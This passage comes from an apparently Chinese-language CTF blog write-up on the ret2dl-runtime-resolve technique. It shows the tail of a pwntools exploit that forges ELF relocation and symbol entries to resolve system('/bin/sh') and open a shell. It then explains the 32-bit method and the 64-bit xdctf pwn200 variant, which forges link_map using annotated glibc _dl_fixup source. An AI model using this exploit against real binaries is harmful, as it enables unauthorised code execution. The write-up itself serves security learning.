class="token operator">-</span> dynsym<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xf</span><span class="token punctuation">)</span>    fake_sym_addr <span class="token operator">+=</span> align    st_name <span class="token operator">=</span> fake_sym_addr <span class="token operator">+</span> <span class="token number">0x10</span> <span class="token operator">-</span> dynstr    fake_write_sym <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span>st_name<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x12</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token comment">#计算.dynsym结构体下标</span>    index_dynsym <span class="token operator">=</span> <span class="token punctuation">(</span>fake_sym_addr <span class="token operator">-</span> dynsym<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">0x10</span>    <span class="token comment">#计算write函数重定位索引</span>    index_offset <span class="token operator">=</span> read_bss_start <span class="token operator">+</span> <span class="token number">0x18</span> <span class="token operator">-</span> rel_plt    r_offset <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"write"</span><span class="token punctuation">]</span>    r_info <span class="token operator">=</span> <span class="token punctuation">(</span>index_dynsym <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token number">0x7</span>    fake_write_reloc <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span>r_offset<span class="token punctuation">,</span> r_info<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token comment">#输出/bin/sh;字符串，我们把该字符串写在read_bss_start+80处</span>    rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>plt0<span class="token punctuation">)</span>    rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>index_offset<span class="token punctuation">)</span>    rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token string">'dead'</span><span class="token punctuation">)</span>    rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>read_bss_start<span class="token operator">+</span><span class="token number">80</span><span class="token punctuation">)</span>    rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>read_bss_start<span class="token operator">+</span><span class="token number">80</span><span class="token punctuation">)</span>    rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>binsh<span class="token punctuation">)</span><span class="token punctuation">)</span>    rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>fake_write_reloc<span class="token punctuation">)</span>    rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token string">'A'</span><span class="token operator">*</span>align<span class="token punctuation">)</span>    rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>fake_write_sym<span class="token punctuation">)</span>    rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token string">'system\x00'</span><span class="token punctuation">)</span>    rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token string">'A'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">80</span><span class="token operator">-</span><span class="token builtin">len</span><span class="token punctuation">(</span>rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>binsh<span class="token punctuation">)</span>    rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token string">'A'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token operator">-</span><span class="token builtin">len</span><span class="token punctuation">(</span>rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment">#print(rop.dump())</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    exp<span class="token punctuation">(</span><span class="token number">0x200</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2023/04/19/ret2-dl-runtime-resolve/19.png"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>我们再次回到这两张图片：</p><p>其实漏洞利用很简单：就是我们自己伪造<code>.dynstr</code>、<code>.dynsym</code>、<code>Elf32_Rel</code>,然后控制程序执行<code>_dl_runtime_resolve(link_map_obj, reloc_index)</code></p><p>具体实现：</p><ul><li>将返回地址覆盖成<code>plt[0]</code>，这样当ret时，程序流就会来到图一的0x8048370地址处，然后会执行<code>push</code>指令把<code>link_map_obj</code>压栈，这时候我们就把<code>_dl_runtime_resolve</code>的第一个参数控制好了</li><li>然后程序执行<code>jmp</code>指令跳转到<code>_dl_runtime_resolve</code>函数执行<ul><li><code>_dl_runtime_resolve</code>函数执行流程如图二：</li><li>首先根据<code>link_map_obj</code>参数得到<code>.dynamic</code>基地址，然后通过相对偏移得到<code>.dynstr</code>，<code>.dynsym</code>，<code>.rel.plt</code>三张表的基地址；</li><li>根据<code>reloc_index</code>索引在<code>.rel.plt</code>中找要解析函数的<code>Elf32_Rel</code>结构体，该结构体有两个成员，r_offset即要解析函数的got值，r_info右移8位后就是要解析函数在<code>.dynsym</code>中的下标；</li><li>然后就可以在<code>.dynsym</code>表中找到该符号在<code>.dynstr</code>中的偏移name_offset；</li><li>然后根据name_offset就可以在<code>.dynstr</code>中找到该函数的函数名st_name；</li><li>然后就会把st_name对应的地址写入对于的got中</li><li>然后<code>_dl_runtime_resolve</code>函数执行完后，又会执行一次got中地址对应的函数</li></ul></li></ul><p>这样大家可能会有以为，<code>_dl_runtime_resolve</code>不是有两个参数吗？</p><ul><li>我们这样给栈布局：</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">esp--<span class="token operator">&gt;</span>plt<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>  --- ret      my_reloc_index<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li>这样当执行ret后，esp指向my_reloc_index，然后push link_map_obj后栈就变成了：</li></ul><pre class="line-numbers language-none"><code class="language-none">esp--&gt;link_map_obj      my_reloc_index<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>所以<code>_dl_runtime_resolve</code>的两个参数我们都可以布置好了</p><p><strong>注意</strong>：这里的my_reloc_index我们是可以控制的：</p><ul><li><p>我们可以控制my_reloc_index，使得：<code>.rel.plt</code>  + <code>reloc_index</code> 指向我们伪造的<code>Elf32_Rel</code>结构体</p></li><li><p>然后我们在伪造的<code>Elf32_Rel</code>结构体中精心设置<code>r_info</code>，使得<code>.dynsym + r_info&gt;&gt;8</code>指向我们伪造的<code>.dynsym</code>表项</p></li><li><p>然后我们在伪造的<code>.dynsym</code>表项中伪造<code>name_offset</code>偏移，使得<code>.dynstr</code>+<code>name_offset</code>指向我们伪造的函数名<code>st_name = system\x00</code></p></li><li><p>这样最后<code>_dl_runtime_resolve</code>就会去解析<code>system</code>函数，并把<code>system</code>函数的地址放在某个got表项中，然后会再去执行一遍got表项中地址对应的函数即<code>system</code>函数，所以我们需要提前把<code>system</code>的参数布置好</p></li></ul><p><img src="/2023/04/19/ret2-dl-runtime-resolve/4.png" alt="图一"></p><p><img src="/2023/04/19/ret2-dl-runtime-resolve/1.png" alt="图二"></p><h1 id="补充-–-64位-2015-xdctf-pwn200"><a href="#补充-–-64位-2015-xdctf-pwn200" class="headerlink" title="补充 – 64位 2015-xdctf-pwn200"></a>补充 – 64位 2015-xdctf-pwn200</h1><ul><li>通过<code>struct link_map *l</code>获取<code>.dynsym .dynstr .rel.plt</code>地址</li><li>将<code>.rel.plt</code>地址与<code>reloc_offset</code>相加，得到函数所对应的<code>Elf64_Rel</code>指针，记作<code>reloc</code></li><li>将<code>(reloc-&gt;r_info)&gt;&gt;32</code>作为<code>.dynsym</code>下标，得到函数所对应的<code>Elf64_Sym</code>指针，记作<code>sym</code></li><li>检查<code>r_info</code>最低位是否为7</li><li>判断<code>(sym-&gt;st_other)&amp;0x03</code>是否为0</li><li>通过 <code>strtab+sym-&gt;st_name</code> 在字符串表中找到函数对应的字符串，然后把真实地址赋给<code>rel_addr</code>（rel_addr指向got表中的对应位置），最后控制权交给这个函数执行。</li></ul><pre class="line-numbers language-c" data-language="c"><code class="language-c"> <span class="token number">1</span> <span class="token function">_dl_fixup</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">link_map</span> <span class="token operator">*</span>l<span class="token punctuation">,</span> <span class="token function">ElfW</span><span class="token punctuation">(</span>Word<span class="token punctuation">)</span> reloc_arg<span class="token punctuation">)</span> <span class="token number">2</span> <span class="token punctuation">{</span> <span class="token number">3</span>  <span class="token number">4</span>   <span class="token comment">//获取符号表地址</span> <span class="token number">5</span>   <span class="token keyword">const</span> <span class="token function">ElfW</span><span class="token punctuation">(</span>Sym<span class="token punctuation">)</span> <span class="token operator">*</span><span class="token keyword">const</span> symtab<span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token function">D_PTR</span> <span class="token punctuation">(</span>l<span class="token punctuation">,</span> l_info<span class="token punctuation">[</span>DT_SYMTAB<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token number">6</span>   <span class="token comment">//获取字符串表地址</span> <span class="token number">7</span>   <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>strtab <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token function">D_PTR</span> <span class="token punctuation">(</span>l<span class="token punctuation">,</span> l_info<span class="token punctuation">[</span>DT_STRTAB<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token number">8</span>   <span class="token comment">//获取函数对应的重定位表结构地址</span> <span class="token number">9</span>   <span class="token keyword">const</span> PLTREL <span class="token operator">*</span><span class="token keyword">const</span> reloc <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token function">D_PTR</span> <span class="token punctuation">(</span>l<span class="token punctuation">,</span> l_info<span class="token punctuation">[</span>DT_JMPREL<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> reloc_offset<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token number">10</span>   <span class="token comment">//获取函数对应的符号表结构地址</span><span class="token number">11</span>   <span class="token keyword">const</span> <span class="token function">ElfW</span><span class="token punctuation">(</span>Sym<span class="token punctuation">)</span> <span class="token operator">*</span>sym <span class="token operator">=</span> <span class="token operator">&amp;</span>symtab<span class="token punctuation">[</span><span class="token function">ELFW</span><span class="token punctuation">(</span>R_SYM<span class="token punctuation">)</span> <span class="token punctuation">(</span>reloc<span class="token operator">-&gt;</span>r_info<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token number">12</span>   <span class="token comment">//得到函数对应的got地址，即真实函数地址要填回的地址</span><span class="token number">13</span>   <span class="token keyword">void</span> <span class="token operator">*</span><span class="token keyword">const</span> rel_addr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>l<span class="token operator">-&gt;</span>l_addr <span class="token operator">+</span> reloc<span class="token operator">-&gt;</span>r_offset<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token number">14</span>   <span class="token number">15</span>   DL_FIXUP_VALUE_TYPE value<span class="token punctuation">;</span><span class="token number">16</span> <span class="token number">17</span>   <span class="token comment">//判断重定位表的类型，必须要为7--ELF_MACHINE_JMP_SLOT</span><span class="token number">18</span>   <span class="token function">assert</span> <span class="token punctuation">(</span><span class="token function">ELFW</span><span class="token punctuation">(</span>R_TYPE<span class="token punctuation">)</span><span class="token punctuation">(</span>reloc<span class="token operator">-&gt;</span>r_info<span class="token punctuation">)</span> <span class="token operator">==</span> ELF_MACHINE_JMP_SLOT<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token number">19</span> <span class="token number">20</span>    <span class="token comment">/* Look up the target symbol.  If the normal lookup rules are not21       used don't look in the global scope.  */</span><span class="token number">22</span>    <span class="token comment">//需要绕过</span><span class="token number">23</span>   <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__builtin_expect</span> <span class="token punctuation">(</span><span class="token function">ELFW</span><span class="token punctuation">(</span>ST_VISIBILITY<span class="token punctuation">)</span> <span class="token punctuation">(</span>sym<span class="token operator">-&gt;</span>st_other<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token number">24</span>    <span class="token punctuation">{</span><span class="token number">25</span>       <span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">r_found_version</span> <span class="token operator">*</span>version <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span><span class="token number">26</span> <span class="token number">27</span>       <span class="token keyword">if</span> <span class="token punctuation">(</span>l<span class="token operator">-&gt;</span>l_info<span class="token punctuation">[</span><span class="token function">VERSYMIDX</span> <span class="token punctuation">(</span>DT_VERSYM<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token number">28</span>   <span class="token punctuation">{</span><span class="token number">29</span>     <span class="token keyword">const</span> <span class="token function">ElfW</span><span class="token punctuation">(</span>Half<span class="token punctuation">)</span> <span class="token operator">*</span>vernum <span class="token operator">=</span><span class="token number">30</span>       <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token function">D_PTR</span> <span class="token punctuation">(</span>l<span class="token punctuation">,</span> l_info<span class="token punctuation">[</span><span class="token function">VERSYMIDX</span> <span class="token punctuation">(</span>DT_VERSYM<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token number">31</span>     <span class="token function">ElfW</span><span class="token punctuation">(</span>Half<span class="token punctuation">)</span> ndx <span class="token operator">=</span> vernum<span class="token punctuation">[</span><span class="token function">ELFW</span><span class="token punctuation">(</span>R_SYM<span class="token punctuation">)</span> <span class="token punctuation">(</span>reloc<span class="token operator">-&gt;</span>r_info<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">0x7fff</span><span class="token punctuation">;</span><span class="token number">32</span>     version <span class="token operator">=</span> <span class="token operator">&amp;</span>l<span class="token operator">-&gt;</span>l_versions<span class="token punctuation">[</span>ndx<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token number">33</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span>version<span class="token operator">-&gt;</span>hash <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token number">34</span>       version <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span><span class="token number">35</span>   <span class="token punctuation">}</span><span class="token number">36</span> <span class="token number">37</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token number">38</span> <span class="token number">39</span>       <span class="token comment">// 接着通过strtab+sym-&gt;st_name找到符号表字符串</span><span class="token number">40</span>       result <span class="token operator">=</span> <span class="token function">_dl_lookup_symbol_x</span> <span class="token punctuation">(</span>strtab <span class="token operator">+</span> sym<span class="token operator">-&gt;</span>st_name<span class="token punctuation">,</span> l<span class="token punctuation">,</span> <span class="token operator">&amp;</span>sym<span class="token punctuation">,</span> l<span class="token operator">-&gt;</span>l_scope<span class="token punctuation">,</span><span class="token number">41</span>             version<span class="token punctuation">,</span> ELF_RTYPE_CLASS_PLT<span class="token punctuation">,</span> flags<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token number">42</span> <span class="token number">43</span>   <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token number">44</span>       <span class="token comment">// value为libc基址加上要解析函数的偏移地址，也即实际地址</span><span class="token number">45</span>       value <span class="token operator">=</span> <span class="token function">DL_FIXUP_MAKE_VALUE</span> <span class="token punctuation">(</span>result<span class="token punctuation">,</span><span class="token number">46</span>            sym <span class="token operator">?</span> <span class="token punctuation">(</span><span class="token function">LOOKUP_VALUE_ADDRESS</span> <span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token number">47</span>             <span class="token operator">+</span> sym<span class="token operator">-&gt;</span>st_value<span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token number">48</span>     <span class="token punctuation">}</span><span class="token number">49</span>   <span class="token keyword">else</span><span class="token number">50</span>     <span class="token punctuation">{</span><span class="token number">51</span>       <span class="token comment">/* We already found the symbol.  The module (and therefore its load52    address) is also known.  */</span><span class="token number">53</span>       value <span class="token operator">=</span> <span class="token function">DL_FIXUP_MAKE_VALUE</span> <span class="token punctuation">(</span>l<span class="token punctuation">,</span> l<span class="token operator">-&gt;</span>l_addr <span class="token operator">+</span> sym<span class="token operator">-&gt;</span>st_value<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token number">54</span>       result <span class="token operator">=</span> l<span class="token punctuation">;</span><span class="token number">55</span>     <span class="token punctuation">}</span><span class="token number">56</span> <span class="token number">57</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token number">58</span> <span class="token number">59</span>   <span class="token comment">// 最后把value写入相应的GOT表条目rel_addr中</span><span class="token number">60</span>   <span class="token keyword">return</span> <span class="token function">elf_machine_fixup_plt</span> <span class="token punctuation">(</span>l<span class="token punctuation">,</span> result<span class="token punctuation">,</span> reloc<span class="token punctuation">,</span> rel_addr<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token number">61</span> <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>32位与64位的主要区别在于这里：</p><p>​64位构造的数据离<code>.dynamic</code>距离较远，因此<code>reloc-&gt;r_info</code>也会较大，会使得<code>vernum[ELFW(R_SYM) (reloc-&gt;r_info)]</code>出现非法内存访问错误</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token number">23</span>   <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__builtin_expect</span> <span class="token punctuation">(</span><span class="token function">ELFW</span><span class="token punctuation">(</span>ST_VISIBILITY<span class="token punctuation">)</span> <span class="token punctuation">(</span>sym<span class="token operator">-&gt;</span>st_other<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token number">24</span>    <span class="token punctuation">{</span><span class="token number">25</span>       <span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">r_found_version</span> <span class="token operator">*</span>version <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span><span class="token number">26</span> <span class="token number">27</span>       <span class="token keyword">if</span> <span class="token punctuation">(</span>l<span class="token operator">-&gt;</span>l_info<span class="token punctuation">[</span><span class="token function">VERSYMIDX</span> <span class="token punctuation">(</span>DT_VERSYM<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token number">28</span>   <span class="token punctuation">{</span><span class="token number">29</span>     <span class="token keyword">const</span> <span class="token function">ElfW</span><span class="token punctuation">(</span>Half<span class="token punctuation">)</span> <span class="token operator">*</span>vernum <span class="token operator">=</span><span class="token number">30</span>       <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token function">D_PTR</span> <span class="token punctuation">(</span>l<span class="token punctuation">,</span> l_info<span class="token punctuation">[</span><span class="token function">VERSYMIDX</span> <span class="token punctuation">(</span>DT_VERSYM<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token number">31</span>     <span class="token function">ElfW</span><span class="token punctuation">(</span>Half<span class="token punctuation">)</span> ndx <span class="token operator">=</span> vernum<span class="token punctuation">[</span><span class="token function">ELFW</span><span class="token punctuation">(</span>R_SYM<span class="token punctuation">)</span> <span class="token punctuation">(</span>reloc<span class="token operator">-&gt;</span>r_info<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">0x7fff</span><span class="token punctuation">;</span><span class="token number">32</span>     version <span class="token operator">=</span> <span class="token operator">&amp;</span>l<span class="token operator">-&gt;</span>l_versions<span class="token punctuation">[</span>ndx<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token number">33</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span>version<span class="token operator">-&gt;</span>hash <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token number">34</span>       version <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span><span class="token number">35</span>   <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>所以在64位我们直接选择伪造<code>link_map</code>，我们尝试通过使<code>sym-&gt;st_other != NULL</code>来绕过这个 if 语句，从而执行：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token number">49</span>   <span class="token keyword">else</span><span class="token number">50</span>     <span class="token punctuation">{</span><span class="token number">51</span>       <span class="token comment">/* We already found the symbol.  The module (and therefore its load52    address) is also known.  */</span><span class="token number">53</span>       value <span class="token operator">=</span> <span class="token function">DL_FIXUP_MAKE_VALUE</span> <span class="token punctuation">(</span>l<span class="token punctuation">,</span> l<span class="token operator">-&gt;</span>l_addr <span class="token operator">+</span> sym<span class="token operator">-&gt;</span>st_value<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token number">54</span>       result <span class="token operator">=</span> l<span class="token punctuation">;</span><span class="token number">55</span>     <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>而<code>DL_FIXUP_MAKE_VALUE</code>会把这个宏判定为已解析过的函数，然后把<code>l-&gt;l_addr + sym-&gt;st_value</code>赋值给 value 。因此我们可以把<code>sym-&gt;st_value</code>伪造为某个已解析函数的got表地址,如read.got ，再把 <code>l-&gt;l_addr</code> 改为目标地址如 system 到 read 的偏移即<code>system-read</code>。那么我们的 value 最后就是 system地址。</p><p>如何让sym-&gt;st_value为已经解析的函数的地址？</p><p>​<strong>如果我们把<code>read_got - 0x8</code>处开始当成sym，那么<code>sym-&gt;st_value</code>就是read的地址，并且<code>sym-&gt;st_other</code>正好也不为0，绕过了if一举两得</strong></p><p>64位所用结构体：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"> <span class="token number">1</span> type <span class="token operator">=</span> <span class="token keyword">struct</span> <span class="token class-name">link_map</span> <span class="token punctuation">{</span> <span class="token number">2</span>     Elf64_Addr l_addr<span class="token punctuation">;</span> <span class="token number">3</span>     <span class="token keyword">char</span> <span class="token operator">*</span>l_name<span class="token punctuation">;</span> <span class="token number">4</span>     Elf64_Dyn <span class="token operator">*</span>l_ld<span class="token punctuation">;</span> <span class="token number">5</span>     <span class="token keyword">struct</span> <span class="token class-name">link_map</span> <span class="token operator">*</span>l_next<span class="token punctuation">;</span> <span class="token number">6</span>     <span class="token keyword">struct</span> <span class="token class-name">link_map</span> <span class="token operator">*</span>l_prev<span class="token punctuation">;</span> <span class="token number">7</span>     <span class="token keyword">struct</span> <span class="token class-name">link_map</span> <span class="token operator">*</span>l_real<span class="token punctuation">;</span> <span class="token number">8</span>     Lmid_t l_ns<span class="token punctuation">;</span> <span class="token number">9</span>     <span class="token keyword">struct</span> <span class="token class-name">libname_list</span> <span class="token operator">*</span>l_libname<span class="token punctuation">;</span><span class="token number">10</span>     Elf64_Dyn <span class="token operator">*</span>l_info<span class="token punctuation">[</span><span class="token number">76</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token comment">//l_info 里面包含的就是动态链接的各个表的信息</span><span class="token number">11</span>     <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token number">12</span>     <span class="token class-name">size_t</span> l_tls_firstbyte_offset<span class="token punctuation">;</span><span class="token number">13</span>     <span class="token class-name">ptrdiff_t</span> l_tls_offset<span class="token punctuation">;</span><span class="token number">14</span>     <span class="token class-name">size_t</span> l_tls_modid<span class="token punctuation">;</span><span class="token number">15</span>     <span class="token class-name">size_t</span> l_tls_dtor_count<span class="token punctuation">;</span><span class="token number">16</span>     Elf64_Addr l_relro_addr<span class="token punctuation">;</span><span class="token number">17</span>     <span class="token class-name">size_t</span> l_relro_size<span class="token punctuation">;</span><span class="token number">18</span>     <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span> l_serial<span class="token punctuation">;</span><span class="token number">19</span>     <span class="token keyword">struct</span> <span class="token class-name">auditstate</span> l_audit<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token number">20</span> <span class="token punctuation">}</span> <span class="token operator">*</span><span class="token number">21</span> <span class="token number">22</span> pwndbg<span class="token operator">&gt;</span> ptype Elf64_Dyn<span class="token number">23</span> type <span class="token operator">=</span> <span class="token keyword">struct</span> <span class="token punctuation">{</span><span class="token number">24</span>     Elf64_Sxword d_tag<span class="token punctuation">;</span><span class="token number">25</span>     <span class="token keyword">union</span> <span class="token punctuation">{</span><span class="token number">26</span>         Elf64_Xword d_val<span class="token punctuation">;</span><span class="token number">27</span>         Elf64_Addr d_ptr<span class="token punctuation">;</span><span class="token number">28</span>     <span class="token punctuation">}</span> d_un<span class="token punctuation">;</span><span class="token number">29</span> <span class="token punctuation">}</span><span class="token number">30</span> <span class="token number">31</span> pwndbg<span class="token operator">&gt;</span> ptype Elf64_Sym<span class="token number">32</span> type <span class="token operator">=</span> <span class="token keyword">struct</span> <span class="token punctuation">{</span><span class="token number">33</span>     Elf64_Word st_name<span class="token punctuation">;</span><span class="token number">34</span>     <span class="token keyword">unsigned</span> <span class="token keyword">char</span> st_info<span class="token punctuation">;</span><span class="token number">35</span>     <span class="token keyword">unsigned</span> <span class="token keyword">char</span> st_other<span class="token punctuation">;</span><span class="token number">36</span>     Elf64_Section st_shndx<span class="token punctuation">;</span><span class="token number">37</span>     Elf64_Addr st_value<span class="token punctuation">;</span><span class="token number">38</span>     Elf64_Xword st_size<span class="token punctuation">;</span><span class="token number">39</span> <span class="token punctuation">}</span><span class="token number">40</span> <span class="token number">41</span> pwndbg<span class="token operator">&gt;</span> ptype Elf64_Rela<span class="token number">42</span> type <span class="token operator">=</span> <span class="token keyword">struct</span> <span class="token punctuation">{</span><span class="token number">43</span>     Elf64_Addr r_offset<span class="token punctuation">;</span><span class="token number">44</span>     Elf64_Xword r_info<span class="token punctuation">;</span><span class="token number">45</span>     Elf64_Sxword r_addend<span class="token punctuation">;</span><span class="token number">46</span> <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们要伪造的关键数据：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">DT_STRTAB指针：位于link_map_addr <span class="token operator">+</span><span class="token number">0x68</span><span class="token punctuation">(</span><span class="token number">32</span>位下是<span class="token number">0x34</span><span class="token punctuation">)</span>DT_SYMTAB指针：位于link_map_addr <span class="token operator">+</span> <span class="token number">0x70</span><span class="token punctuation">(</span><span class="token number">32</span>位下是<span class="token number">0x38</span><span class="token punctuation">)</span>DT_JMPREL指针：位于link_map_addr <span class="token operator">+</span><span 